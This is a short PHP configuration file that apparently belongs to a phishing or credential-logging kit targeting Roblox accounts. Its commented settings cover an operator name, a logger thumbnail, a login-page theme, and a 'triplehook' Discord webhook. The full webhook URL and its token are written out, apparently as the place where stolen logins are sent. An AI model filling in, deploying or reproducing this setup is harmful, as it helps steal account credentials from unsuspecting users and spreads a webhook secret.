<?php
$name = 'ALLQVOID'; // Change to ur own name
$thumbnail = 'https://images.rbxcdn.com/cece570e37aa8f95a450ab0484a18d91'; // discord webhook thumbnail & logger thumbnail
$hex = '#00000'; // color shit
$triplehook = 'https://discord.com/api/webhooks/1448713650629246977/cWtQq3F9Scg3mxN645XzdQEt2gEmhH5Yip5BDTPj37myl70yCVjPSnxS1T97hphlXgZB'; // input ur fucking triplehook webhook here 
$loginColor = [
    "theme" => "dark", // change be changed to white to for white login page
];
?>


